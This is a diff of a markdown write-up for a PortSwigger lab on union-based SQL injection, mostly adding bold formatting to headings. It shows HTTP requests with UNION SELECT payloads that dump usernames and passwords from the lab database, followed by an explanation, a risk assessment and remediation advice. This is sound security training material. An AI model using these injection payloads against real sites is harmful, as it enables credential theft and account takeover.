@@ -77,7 +77,7 @@ GET /filter?category='+UNION+SELECT+'abc','def'-- HTTP/2
 Host: 0a2b009104512070d572f38800020044.web-security-academy.net
 Cookie: session=5ARYZkWVvhgbD47AAXN29US0mIwGbedR
 
-Response:
+**Response:**
 
 HTTP/2 200 OK
 Content-Type: text/html; charset=utf-8
@@ -94,7 +94,7 @@ Content-Type: text/html; charset=utf-8
 </table>
 
 
-Successful UNION Exploitation (Extract Credentials):
+**Modified Request 1:**
 
 GET /filter?category=Gifts'+UNION+SELECT+username_ihykoy,+password_jzywxw+FROM+users_padysk-- HTTP/2
 Host: 0a9d00f703222058803a8aa100c70047.web-security-academy.net
@@ -102,7 +102,7 @@ Cookie: session=kJbxExTQr6twXFYGd4L9P2eXbY1aiif1
 ...
 
 
-Response: 
+**Response:**
 
 HTTP/2 200 OK
 Content-Type: text/html; charset=utf-8
@@ -117,7 +117,7 @@ Content-Type: text/html; charset=utf-8
 
 
 
-Proof of Exploitation:
+**Proof of Exploitation:**
 
 
 ![Proof of SQL Injection Error]()
@@ -136,7 +136,7 @@ Figure 3: Portswigger Lab Completed Successfully
 
 
 
-Exploitation Explanation:
+**Exploitation Explanation:**
 
 The vulnerable query is like SELECT title, description FROM products WHERE category = '[input]'.
 Single quote closes string → error.
@@ -146,7 +146,7 @@ Final payload: ' UNION SELECT username, password FROM users -- dumps credentials
 
 
 
-Risk Assessment:
+**Risk Assessment:**
 
 Likelihood of Exploitation: High (reflected results + no sanitization).
 Potential Impact: Critical — full database dump, credential theft, account takeover.
@@ -154,7 +154,7 @@ Affected Components: Backend database (PostgreSQL/MySQL based on lab setup).
 
 
 
-Recommendations for Remediation:
+**Recommendations for Remediation:**
 
 Use prepared statements / parameterized queries (e.g., PDO in PHP, PreparedStatement in Java).
 Implement strict input validation and sanitization (escape special characters).
@@ -164,17 +164,19 @@ Conduct regular code reviews and scanning (OWASP ZAP, sqlmap, Burp Scanner).
 
 
 
-Conclusion and Lessons Learned:
+**Conclusion and Lessons Learned:*₹
 
 This lab demonstrated union-based SQL injection to enumerate and extract database contents on non-Oracle systems.
+
 Key Takeaways:
+
 Determine column count with incremental NULL in UNION.
 Use information_schema for non-Oracle DB enumeration.
 Strengthened skills in blind/reflected SQLi, payload crafting, and ethical reporting.
 
 
 
-References:
+**References:**
 
 PortSwigger Academy: SQL Injection
 Specific Lab: SQL injection attack, listing the database contents on non-Oracle databases
